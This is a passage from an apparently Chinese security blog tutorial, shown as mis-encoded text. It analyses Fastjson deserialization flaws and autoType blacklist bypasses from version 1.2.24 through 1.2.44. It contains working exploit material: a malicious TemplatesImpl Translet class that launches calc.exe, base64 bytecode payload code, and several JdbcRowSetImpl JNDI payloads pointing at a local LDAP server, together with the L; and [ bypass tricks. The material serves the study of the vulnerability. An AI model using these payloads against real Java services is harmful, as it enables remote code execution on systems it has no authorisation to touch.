æ­¤å¯ä»¥ç›´æ¥èµ‹å€¼ï¼Œfull_nameã€sexã€propç­‰privateå±æ€§å› ä¸ºæ²¡æœ‰è®¾ç½®setterå› æ­¤ä¹Ÿèµ‹å€¼å¤±è´¥ï¼Œageè™½ä¸ºprivateå±æ€§ï¼Œä½†<code>public void setAge(int age)</code>è¢«è°ƒç”¨æˆåŠŸï¼Œå› æ­¤è¢«èµ‹å€¼</p><p>private sex getsexå‡½æ•°æ²¡æœ‰è¢«è°ƒç”¨,private prop getpropå‡½æ•°è¢«æˆåŠŸè°ƒç”¨</p><p>æ€»ç»“ï¼š</p><ul><li>ååºåˆ—åŒ–èµ‹å€¼æ—¶ï¼Œpublicå±æ€§ç›´æ¥èµ‹å€¼ï¼Œprivateå±æ€§è¦è°ƒç”¨setter</li><li>getxxx(xxxä¸ºå±æ€§å)çš„å‡½æ•°ä¼šæ ¹æ®å‡½æ•°è¿”å›å€¼çš„ä¸åŒï¼Œè€Œé€‰æ‹©è¢«è°ƒç”¨æˆ–ä¸è¢«è°ƒç”¨</li></ul></blockquote><h3 id="parseè¿‡ç¨‹"><a href="#parseè¿‡ç¨‹" class="headerlink" title="parseè¿‡ç¨‹"></a>parseè¿‡ç¨‹</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241845.png"                      alt="image-20230810202238068"                ><figcaption>image-20230810202238068</figcaption></figure></p><h4 id="è¯¥è¿‡ç¨‹ä¸­è°ƒç”¨çš„setteræ–¹æ³•è¦æ±‚"><a href="#è¯¥è¿‡ç¨‹ä¸­è°ƒç”¨çš„setteræ–¹æ³•è¦æ±‚" class="headerlink" title="è¯¥è¿‡ç¨‹ä¸­è°ƒç”¨çš„setteræ–¹æ³•è¦æ±‚"></a>è¯¥è¿‡ç¨‹ä¸­è°ƒç”¨çš„setteræ–¹æ³•è¦æ±‚</h4><ul><li>æ–¹æ³•åé•¿åº¦å¤§äº4ä¸”ä»¥setå¼€å¤´ï¼Œä¸”ç¬¬å››ä¸ªå­—æ¯è¦æ˜¯å¤§å†™</li><li>éé™æ€æ–¹æ³•</li><li>è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»</li><li>å‚æ•°ä¸ªæ•°ä¸º1ä¸ª</li></ul><blockquote><p>å¯»æ‰¾åˆ°ç¬¦åˆè¦æ±‚çš„setå¼€å¤´çš„æ–¹æ³•åä¼šæ ¹æ®ä¸€å®šè§„åˆ™æå–æ–¹æ³•ååçš„å˜é‡åã€‚å†å»è·Ÿè¿™ä¸ªç±»çš„å±æ€§å»æ¯”å¯¹æœ‰æ²¡æœ‰è¿™ä¸ªåç§°çš„å±æ€§ã€‚</p><p>å¦‚æœæ²¡æœ‰è¿™ä¸ªå±æ€§å¹¶ä¸”è¿™ä¸ªsetæ–¹æ³•çš„è¾“å…¥æ˜¯ä¸€ä¸ªå¸ƒå°”å‹ï¼Œä¼šé‡æ–°ç»™å±æ€§åå‰é¢åŠ ä¸Š<strong>is</strong>ï¼Œå†å–å¤´ä¸¤ä¸ªå­—ç¬¦ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºå¤§å†™(å³isNa)ï¼Œå»å¯»æ‰¾è¿™ä¸ªå±æ€§åã€‚</p></blockquote><h4 id="è¯¥è¿‡ç¨‹ä¸­è°ƒç”¨çš„getteræ–¹æ³•è¦æ±‚"><a href="#è¯¥è¿‡ç¨‹ä¸­è°ƒç”¨çš„getteræ–¹æ³•è¦æ±‚" class="headerlink" title="è¯¥è¿‡ç¨‹ä¸­è°ƒç”¨çš„getteræ–¹æ³•è¦æ±‚"></a>è¯¥è¿‡ç¨‹ä¸­è°ƒç”¨çš„getteræ–¹æ³•è¦æ±‚</h4><ul><li>æ–¹æ³•åé•¿åº¦å¤§äºç­‰äº4</li><li>éé™æ€æ–¹æ³•</li><li>ä»¥getå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>æ— ä¼ å…¥å‚æ•°</li><li>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicIntegeræˆ–AtomicLong</li></ul><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><h2 id="Fastjson-lt-x3D-1-2-24"><a href="#Fastjson-lt-x3D-1-2-24" class="headerlink" title="Fastjson&lt;&#x3D;1.2.24"></a>Fastjson&lt;&#x3D;1.2.24</h2><h3 id="TemplatesImplåˆ©ç”¨é“¾"><a href="#TemplatesImplåˆ©ç”¨é“¾" class="headerlink" title="TemplatesImplåˆ©ç”¨é“¾"></a><strong>TemplatesImpl</strong>åˆ©ç”¨é“¾</h3><h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ol><li><p>æœåŠ¡ç«¯ä½¿ç”¨parseObject()æ—¶ï¼Œå¿…é¡»ä½¿ç”¨å¦‚ä¸‹æ ¼å¼æ‰èƒ½è§¦å‘æ¼æ´: JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</p></li><li><p>æœåŠ¡ç«¯ä½¿ç”¨parse()æ—¶ï¼Œéœ€è¦ JSON.parse(text1,Feature.SupportNonPublicField);</p></li></ol><blockquote><p>è¿™æ˜¯å› ä¸ºcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpléœ€è¦èµ‹å€¼çš„ä¸€äº›å±æ€§ä¸ºprivate å±æ€§ï¼ŒæœåŠ¡ç«¯å¿…é¡»æ·»åŠ ç‰¹æ€§æ‰å›å»ä»jsonä¸­æ¢å¤privateå±æ€§çš„æ•°æ®ã€‚</p></blockquote><p>æ€»ä½“æ¥è¯´æ˜¯ç›´æ¥ååºåˆ—åŒ–TemplatesImpl,ç”±äºå­˜åœ¨ Feature.SupportNonPublicField è®¾ç½®(å…è®¸privateå¯¹è±¡ä¼ å…¥)ï¼Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨setValueï¼Œè¿™é‡Œä¼šæŠŠæ‰€æœ‰å±æ€§å­˜å‚¨åˆ°filedInfoä¸­ï¼Œåˆ°outputPropertiesçš„æ—¶å€™ï¼Œå› ä¸ºå®ƒæ˜¯ä¸ªç±»ï¼Œå­˜åœ¨ methodï¼Œäºæ˜¯è¿›å…¥ifåˆ†æ”¯ï¼Œè°ƒç”¨æ–¹æ³•ä¸º<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241981.png"                      alt="image-20230810204820756"                ><figcaption>image-20230810204820756</figcaption></figure></p><p>ä¹‹åä¼šè°ƒç”¨newTransformer()</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241346.png"                      alt="image-20230810204854867"                ><figcaption>image-20230810204854867</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241715.png"                      alt="image-20230810204903707"                ><figcaption>image-20230810204903707</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241200.png"                      alt="image-20230810204916936"                ><figcaption>image-20230810204916936</figcaption></figure></p><blockquote><p>æœ€åå°±æ˜¯åˆå§‹åŒ–ç±»è¿›è€Œä»£ç æ‰§è¡Œäº†</p></blockquote><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>æ¶æ„ç±»</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Shell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">&#125; &#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span></span><br><span class="line">TransletException &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span><br><span class="line"><span class="params">SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure></div><p>å·¥å…·ç±»</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">FiletoBase64</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">io</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10240</span>];</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="keyword">while</span> ((len = io.read(buf)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        os.write(buf, <span class="number">0</span>, len);</span><br><span class="line">    &#125;</span><br><span class="line">    io.close();</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(os.toByteArray());</span><br><span class="line"><span class="keyword">return</span> s; &#125;</span><br></pre></td></tr></table></figure></div><p>payload</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> ClassBase64Util.FiletoBase64(<span class="string">&quot;./Shell.class&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">payload1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+shell+<span class="string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(payload1);</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(payload1, Feature.SupportNonPublicField);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure></div><h3 id="JdbcRowSetImplåˆ©ç”¨é“¾"><a href="#JdbcRowSetImplåˆ©ç”¨é“¾" class="headerlink" title="JdbcRowSetImplåˆ©ç”¨é“¾"></a><strong>JdbcRowSetImplåˆ©ç”¨é“¾</strong></h3><p>åˆ©ç”¨é“¾åˆ†æ:åœ¨è®¾ç½®AutoCommitå±æ€§æ—¶ï¼Œè°ƒç”¨setAutoCommit()æ–¹æ³•ï¼Œconné»˜è®¤ä¸ºç©ºï¼Œè¿›å…¥elseæ‰§è¡Œthis.conn &#x3D; this.connect();</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032241111.png"                      alt="image-20230810205442293"                ><figcaption>image-20230810205442293</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032242017.png"                      alt="image-20230810205413334"                ><figcaption>image-20230810205413334</figcaption></figure></p><p>conné»˜è®¤ä¸ºç©ºï¼Œè‹¥this.getDataSourceName() !&#x3D; nullåˆ™è¿›å…¥else if,è°ƒç”¨è‡³ lookup(this.getDataSourceName()</p><p>æ•…æ­¤å¤„å­˜åœ¨JNDIæ³¨å…¥ï¼Œpayloadä¸º:</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1099/badClassName&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure></div><h2 id="1-2-25-lt-x3D-Fastjson-lt-x3D-1-2-41"><a href="#1-2-25-lt-x3D-Fastjson-lt-x3D-1-2-41" class="headerlink" title="1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.41"></a>1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.41</h2><h3 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>å¼€å¯autoTypeSupport,å½±å“ç‰ˆæœ¬1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41</p><h3 id="ç‰ˆæœ¬åˆ†æ"><a href="#ç‰ˆæœ¬åˆ†æ" class="headerlink" title="ç‰ˆæœ¬åˆ†æ"></a>ç‰ˆæœ¬åˆ†æ</h3><p>FastJSON1.2.24</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ref = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="built_in">this</span>.config.getDefaultClassLoader());</span><br></pre></td></tr></table></figure></div><p>FastJSON1.2.25</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ref = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = <span class="built_in">this</span>.config.checkAutoType(ref, (Class)<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div><blockquote><p>åŠ è½½ç±»ä»TypeUtils.loadClass å˜æˆäº†this.config.checkAutoType</p></blockquote><p>åŒæ—¶åœ¨1.2.25å<code>com.alibaba.fastjson.parser.ParserConfig</code>ç±»åŠ äº†å±æ€§</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> autoTypeSupport; <span class="comment">//æ§åˆ¶æ˜¯å¦å¯è¿›è¡Œååºåˆ—åŒ–ï¼Œé»˜è®¤ä¸ºfalse</span></span><br><span class="line"><span class="keyword">private</span> String[] denyList; <span class="comment">//é»‘åå•</span></span><br><span class="line"><span class="keyword">private</span> String[] acceptList; <span class="comment">//ç™½åå•</span></span><br></pre></td></tr></table></figure></div><blockquote><p>é»‘ç™½åå•åœ¨æ„é€ æ–¹æ³•ä¸­èµ‹å€¼</p></blockquote><p>ååºåˆ—åŒ–ä¸­ä¹Ÿä½¿ç”¨äº†<code>ParserConfig#checkAutoType()</code>,ä¸‹å›¾ä¸ºcom.alibaba.fastjson.parser.DefaultJSONParserä¸­parseObject()æ–¹æ³•</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032242548.png"                      alt="image-20230810210025230"                ><figcaption>image-20230810210025230</figcaption></figure></p><p>checkAutoType()ä¸­å¯¹autoTypeSupportè¿›è¡Œåˆ¤æ–­</p><ul><li>è‹¥ä¸ºtrueåˆ™å…ˆè¿›è¡Œç™½åå•æ ¡éªŒï¼Œè‹¥ä¸ºç™½åå•å†…åˆ™è¿› å…¥TypeUtils.loadClassï¼Œåå†è¿›è¡Œé»‘åå•æ ¡éªŒï¼Œè‹¥åœ¨é»‘åå•ä¸­åˆ™æŠ›å‡ºå¼‚å¸¸(autoType is not support â€¦)ï¼Œè‹¥æœªåœ¨é»‘åå•ä¸­åˆ™åœ¨Mapä¸­æŸ¥æ‰¾ç±»</li><li>è‹¥autoTypeSupportä¸ºfalse,åˆ™è¿›è¡Œé»‘åå•åˆ¤æ–­ï¼Œå†è¿›è¡Œç™½åå•åˆ¤æ–­ï¼Œæœ€åè‹¥autoTypeSupport&#x3D;trueï¼Œ ä¼šå†ä¸€æ¬¡è¿›è¡Œåˆ¤æ–­ç„¶åè¿›å…¥åˆ°TypeUtils.loadClassä¸­</li></ul><p>com.alibaba.fastjson.util.TypeUtils#loadClass()ä¸­å¯¹[ L ;è¿›è¡Œäº†å¤„ç†ï¼Œè€Œå…¶ä¸­åœ¨å¤„ç†L ;çš„æ—¶å€™å­˜åœ¨äº†é€» è¾‘æ¼æ´ï¼Œå¯ä»¥åœ¨classNameçš„å‰ååˆ†åˆ«åŠ ä¸ŠL ;æ¥è¿›è¡Œç»•è¿‡</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032242965.png"                      alt="image-20230810211123310"                ><figcaption>image-20230810211123310</figcaption></figure></p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>); <span class="comment">//å¼€å¯autoTypeSupport</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:13 89/Basic/Command/calc&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure></div><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 æœªå¼€å¯autoTypeSupport</li><li>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.347 autoTypeSupportå¼€å¯æˆ–æœªå¼€å¯å‡å¯åˆ©ç”¨<ul><li>checkAutoTypeæºç ä¿®æ”¹ï¼Œè‹¥autoTypeSupportä¸ºtrue,å½“ç›®æ ‡ç±»åœ¨é»‘åå•ä¸­ï¼Œéœ€è¦ç›®æ ‡ç±»ä¸åœ¨mapä¸­æ‰ ä¼šæŠ›å‡ºå¼‚å¸¸</li></ul></li></ul><p>payload</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;A&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,</span><br><span class="line"> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>å…¶å®å°±æ˜¯ä¼ ä¸¤ä¸ªå¯¹è±¡ï¼Œè§£æä¸¤æ¬¡ï¼Œè§£æå®Œç¬¬ä¸€ä¸ªå¯¹è±¡æ—¶ä¼šæŠŠcom.sun.rowset.JdbcRowSetImplé©¾åˆ°ç¼“å­˜mapä¸­ï¼Œç¬¬äºŒæ¬¡æ—¶å°±å¯ä»¥ç›´æ¥è·å–åˆ°ç›®æ ‡ç±»</p><p>Açš„è§£é‡Š</p><ul><li><p>åœ¨MiscCodec#deserialze()æ–¹æ³•ä¸­ï¼Œä¼šè§£æstrVal(å¯¹åº”valçš„å€¼),å½“clazz &#x3D;&#x3D; Class.classï¼Œè°ƒç”¨ TypeUtils.loadClass(),æ­¤æ—¶strValä¸ºvalå¯¹åº”å€¼,è¿™æ ·å°±å¯ä»¥æŠŠvalä¸­çš„ç±»åŠ è½½åˆ°ç¼“å­˜mapï¼ˆmappingsï¼‰ä¸­</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Class.class) &#123; <span class="comment">//å½“clazz == Class.classï¼Œè°ƒç”¨ TypeUtils.loadClass(),æ­¤æ—¶strValä¸ºvalå¯¹åº”å€¼</span></span><br><span class="line"><span class="keyword">return</span> TypeUtils.loadClass(strVal,parser.getConfig().getDefaultClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ul></blockquote><h2 id="Fastjson-x3D-1-2-42"><a href="#Fastjson-x3D-1-2-42" class="headerlink" title="Fastjson &#x3D; 1.2.42"></a><strong>Fastjson &#x3D; 1.2.42</strong></h2><h3 id="åˆ©ç”¨æ¡ä»¶-2"><a href="#åˆ©ç”¨æ¡ä»¶-2" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>Fastjson &lt;&#x3D; 1.2.42 å¼€å¯autoTypeSupport</p><p>Fastjson1.2.42å°†é»‘åå•ç”±å­—ç¬¦ä¸²ç›´æ¥æ¯”å¯¹æ”¹ä¸ºäº†HashCodeã€‚checkAutoType()ä¸­åœ¨é»‘åå•ç»•è¿‡çš„æ—¶å€™ åšäº†ä¸€ä¸ªæ ¡éªŒï¼Œå¦‚æœç±»åä»¥Lå¼€å¤´ï¼Œ;ç»“å°¾ï¼Œåˆ™ä¼šç”¨stubstring()å»é™¤ç±»åå‰çš„ç¬¬ä¸€ä¸ªL,<u>åŒå†™Lå³å¯ç»•è¿‡</u></p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>); <span class="comment">//å¼€å¯autoTypeSupport </span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1: 1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Fastjson-x3D-1-2-43"><a href="#Fastjson-x3D-1-2-43" class="headerlink" title="Fastjson &#x3D; 1.2.43"></a><strong>Fastjson &#x3D; 1.2.43</strong></h2><h3 id="åˆ©ç”¨æ¡ä»¶-3"><a href="#åˆ©ç”¨æ¡ä»¶-3" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>Fastjson &lt;&#x3D; 1.2.43å¼€å¯autoTypeSupport</p><p>Fastjson &lt;&#x3D; 1.2.43ï¼ŒcheckAutoType()å¯¹LLè¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœç±»ä»¥LLå¼€å¤´ï¼ŒæŠ›å‡ºå¼‚å¸¸,ä½†åœ¨ TypeUtils.loadClassä¸­ï¼Œè¿˜å¯¹[è¿›è¡Œäº†å¤„ç†ï¼Œå› æ­¤åˆå¯ä»¥é€šè¿‡[æ¥è¿›è¡Œç»•è¿‡</p><p>TypeUtils#loadClass()</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>); <span class="comment">//å¼€å¯autoTypeSupport </span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span> [&#123;,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span> &#125;</span><br></pre></td></tr></table></figure></div><h2 id="Fastjson-x3D-1-2-44"><a href="#Fastjson-x3D-1-2-44" class="headerlink" title="Fastjson &#x3D; 1.2.44"></a><strong>Fastjson &#x3D; 1.2.44</strong></h2><p>ä¿®å¤äº†[çš„ç»•è¿‡ï¼Œåœ¨checkAutoTypeä¸­è¿›è¡Œåˆ¤æ–­å¦‚æœç±»åä»¥[æˆ–Lå¼€å¤´æŠ›å‡ºå¼‚å¸¸ã€‚L[è®©ç»• è¿‡æ–¹æ³•å¤±æ•ˆï¼Œå¯ä½¿ç”¨JSONå†…ç½®payload</p><h3 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 